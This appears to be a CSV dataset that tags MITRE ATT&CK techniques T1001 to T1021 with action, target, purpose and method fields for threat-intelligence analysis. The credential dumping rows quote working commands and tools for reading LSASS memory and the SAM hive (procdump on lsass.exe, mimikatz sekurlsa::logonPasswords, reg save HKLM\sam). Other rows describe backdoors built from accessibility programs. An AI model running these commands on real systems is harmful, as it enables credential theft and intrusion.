0,1,3,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,1,1,156,command and control,data obfuscation,t1001,hide,command and control (c2) communications,,,,,difficult to discover or decipher ; make the communication less conspicuous ; <what> hide <\what><where> commands <\where> from being seen,make difficult; make communication; hide,disvover command; less conspicuous; command,add junck data to protocol traffic; use steganography; <what>commingling <\what> legitimate <where> traffic <\where> with c2 communications traffic; usenon-standard data encoding system,add-junk-data; use; commingle-legitimate-traffic; use,protocol traffic; steganography; C2 traffic; non-standard data encoding system,C2-Channel-established,,data-flow-uncommon,
,1,1,148,exfiltration,data compressed,t1002,compress,data/documents,sensitive,data is-a collected,collect,data,make data portable; minimize data size,minimize,data-length,using program/algorithm/compression library/utility/7zip/rar/zip/zlib,use,program/algorithm/compression library/utility/7zip/rar/zip/zlib,compression-utility-access,,data-compressed,
,,,122,credential access,credential dumping,t1003,decrypt,Group Policy Preference XML file,,,,,harvests passwords and hash;obtain victim account credential,harvest/obtain,password/ hash/account credential,"using Metasploit?s post exploitation module: ""post/windows/gather/credentials/gpp""; Get-GPPPassword ;gpprefdecrypt.py",use,"Metasploit?s post exploitation module: ""post/windows/gather/credentials/gpp"";Get-GPPPassword ;
gpprefdecrypt.py",,,,
,,,123,credential access,credential dumping,t1003,dump,LSASS process memory /process memory/credential/password,,,,,harvests passwords and hash;obtain victim account credential,harvest/obtain,password/ hash/account credential,using MimiPenguin tool; /proc filesystem; looking for text strings and regex pattern; using procdump/mimikatz/DCSync,look;use,"text string/regex pattern;MimiPenguin tool;"" /proc filesystem""/procdump/mimikatz/DCSync/lsadump/Windows Credential Editor/procdump -ma lsass.exe lsass_dump/sekurlsa::Minidump lsassdump.dmp/sekurlsa::logonPasswords",,Account Manipulation; Pass the Ticket,,
,,,124,credential access,credential dumping,t1003,extract-password/extract-credential,registry key,,,,,extract from the registry and creddump7 used to gather the credentials; ,,,"using Reg utility/Reg.exe;""reg save HKLM\sam sam"";
""reg save HKLM\system system""",use,"Reg utility/Reg.exe;""reg save HKLM\sam sam"";
""reg save HKLM\system system""",,,,
,,,121,credential access,credential dumping,t1003,extract/retrive/enumerate/gather,sam database/sam/sam file/Cached Credential/LSA secret/Local Security Authority  Secret/NTDS file/Active Directory hash/ Group Policy Preference XML file,,,,,harvests passwords and hash;obtain victim account credential,harvest/obtain,password/ hash/account credential,"use Volume Shadow Copy/secretsdump.py/ ntdsutil.exe/Invoke-NinjaCopy/pwdumpx.exe/gsecdump/
Mimikatz/secretsdump.py/Creddump7/gsecdump",use,"Volume Shadow Copy/secretsdump.py/ ntdsutil.exe/Invoke-NinjaCopy/pwdumpx.exe/gsecdump/
Mimikatz/secretsdump.py/Creddump7/gsecdump",,,,
,,,120,credential access,credential dumping,t1003,use,credential dumping,,,,,harvests passwords and hash;obtain victim account credential,harvest/obtain,password/ hash/account credential,,,,,,,
,,,780,persistence,winlogon helper dll,t1004,modify,winlogon registry key /winlogon\notify registry key/ winlogon\userinit registry key/winlogon\shell registry key,,,,,<what>load<\what> and <what>execute<\what> malicious <where>dlls<\where> and/or <where>executables<\where>,load / execute,dll /executable,modify winlogon registry key,modify,winlogon registry key,,,,
,1,,152,collection,data from local system,t1005,search,file system,,,compromise,computer,<what> find <\what> <where> files <\where> of interest<what> gather <\what> <where> information <\where>;exfiltration,find;gather/collect,files;information,"using command-line interface, such as cmd; Automated Collection",use,command-line interface technique/cmd technique/ Automated Collection technique,,,,Automated Collection; Command-Line Interface
,,,244,defense evasion,file system logical offsets,t1006,read/write,file,directly,programs with direct access,,,<what> bypasses <\what> <attribute> windows file <\attribute> <where> access controls <\where> as well as <attribute> file system monitoring tools <\attribute>,bypass,access control,analyzing file system data structure; use ninjacopy,analyze;use,file system data structure; ninjacopy,,,,
,,,691,discovery,System Service Discovery,t1007,obtain-information/get-information/enumerate/list/ query,service/service configuration,registered,service is-a registered,,,discover running service,discover,running-service,"using ""sc,"" ""tasklist /svc"" using Tasklist, and ""net start"" using Net,",use,"sc utility/ ""sc""/tasklist utility/net utility/net start/""tasklist /svc""",,,,
,1,,238,command and control,fallback channels,t1008,use,fallback-communication-channel/alternate-communication-channel,alternate,<object>primary channel <\object>is <condition> compromised<\condition> or <condition>inaccessible <\condition>,inaccessible,primary channel,maintain reliable command and control ;avoid  data transfer thresholds,maintain;avoid,command and control;data transfer threshold,using multiple C2 server/ port,use,multiple c2 server/multiple port,primary-channel-inaccessible,,C2-channel-switched,
,,,57,defense evasion,binary padding,t1009,add-junk-data,file,,,,,<what> increase <\what> the <where> size <\where><what> change <\what> the <where> file hash <\where> avoid hash-based blacklists,increase;change;avoid,size;file hash; hash-based blacklist/static anti-virus signature,using binary padding,use,binary padding technique,,,,
,,,48,discovery,application window discovery,t1010,get-list,open application windows,,,,,convey information about system use procedure,give-information-context,keylogger,use applescript script,use,applescript script,,,,
,,,210,exfiltration,exfiltration over other network medium,t1011,exfiltrate,data,,sufficient access or proximity,sufficient access or proximity,connection,exfiltrate data,exfiltrate,data,"use wifi-connection, modem , cellular-data-connection, bluetooth, radio-frequency-channel",use,wifi-connection/modem/cellular-data-connection/bluetooth/radio-frequency-channel,network-medium-available,,data-transferred,
,,,513,discovery,query registry,t1012,interact/query,windows registry,,,,,,gather,system-information/installed software infromation/system configuration information,,,,,,,
,,,463,"persistence,privilege escalation",port monitors,t1013,use,port monitors,,permissions allow,,,<what>load<\what> malicious <where>code<\where> at startup;,load,dll/code,<what>writing<\what> a fully-qualified <where>pathname<\where> for that dll to hklm\system\currentcontrolset\control\print\monitors; through API call,write;use,fully-quantified dll pathname to registry key to hklm\system\currentcontrolset\control\print\monitors; API call,,,,
1,,,556,defense evasion,rootkit,t1014,use,rootkit,,,,"hypervisor , master boot record , system firmware or others","<what>hide<\what> the presence of <where>programs<\where>, <where>files<\where>, <where>network connections<\where>, <where>services<\where>, <where>drivers<\where>, and other system components",hide,program/ files / network connection/ service/driver,"<what>intercepting<\what> (i.e., <what>hooking<\what>) and <what>modifying<\what> <where>operating system api calls<\where>",incercept/hook/modify,operating system API call,,,,
,,,13,"persistence,privilege escalation",accessibility features,t1015,modify,registry key,,"
connected over Remote Desktop Protocol",,,<what> get/use <\what> a <where> command prompt <\where> or <where> backdoor <\where> without logging in to the system;execute replaced file with system privilege,execute;get/use,replaced-file;command prompt/backdoor,replace the accessblity program debugger registry key with path of cmd.exe,replace,accessblity program debugger registry key with cmd.exe-path,,,,
,,,14,"persistence,privilege escalation",accessibility features,t1015,replace,accessibility program/utilman.exe/osk.exe/Magnify.exe/Narrator.exe/DisplaySwitch.exe/AtBroker.exe/sethc.exe,"c:\windows\system32\sethc.exe,c:\windows\system32\utilman.exe","
connected over Remote Desktop Protocol",,,<what> get/use <\what> a <where> command prompt <\where> or <where> backdoor <\where> without logging in to the system;execute replaced file with system privilege,execute;get/use,replaced-file;command prompt/backdoor,pressing appropriate key combination,press,key-combination/windows+U/shift-key-5/sticky key,,,,
,,,682,discovery,System Network Configuration Discovery,t1016,search/look,network configuration/system setting,,,,,gather information,gather/discover,remote system information,"use  Arp, ipconfig/ifconfig, nbtstat, and route.",use,"Arp, ipconfig/ifconfig, nbtstat, route",,,,
,,,37,lateral movement,application deployment software,t1017,deploy/execute,software/code,"malicious,remote","permissions required for this action<object> local credentials <\object> may be sufficient with direct access to the deployment server, or specific <object> domain credentials <\object> may be required<condition> require <\condition> an <object> administrative account<\object>",require,"local credentials,administrative account",move laterally to systems; gather information; wipe hard drive ,move laterally;gather;wipe,system; information;hard drive,using application deployment software,use,application deployment software,application-deployment-software-access,software-deployed;software-executed,,
,,,543,discovery,remote system discovery,t1018,get-list,system/ IP address/hostname/logical identifier,,,,,,get-listing/discover/gain-insight;gather/acquire,systems/hostname-ip address mapping;information-remote-system,"use ping utility/net utility/""net view""/ ""/etc/hosts file""/ C:\Windows\System32\Drivers\etc\host",use;view,"c:\windows\system32\drivers\etc\hosts file/""/etc/hosts file"";net utility/net view/ping utility",,,,
,,,676,persistence,system firmware,t1019,modify/overwrite,system firmware/bios/uefi,,,,,<what>perform<\what> or <what>assist<\what> in malicious activity; install firmware update;maintain persistence,perform /assist; install; maintain,malicious activity; firmware update; persistence,,,,,,,
,1,,55,exfiltration,automated exfiltration,t1020,exfiltrate,data/document,sensitive,data gathered during collection,gathered during collection,data,,,,use automated processing/scripting,use,automated processing/scripting technique/  Exfiltration Over Command and Control Channel technique/ Exfiltration Over Alternative Protocol technique,data-staged,,data-transferred,
,,,542,lateral movement,remote services,t1021,login,service/remote-system,,credential is-a known,known,credential,move laterally to system,move-laterally,system,using remote service/SSH/telnet/VNC/valid account technique,use,remote-service/SSH/VNC/telnet/valid account technique,remote-connection-accepted;credential-known,,remote-login-succeeded,
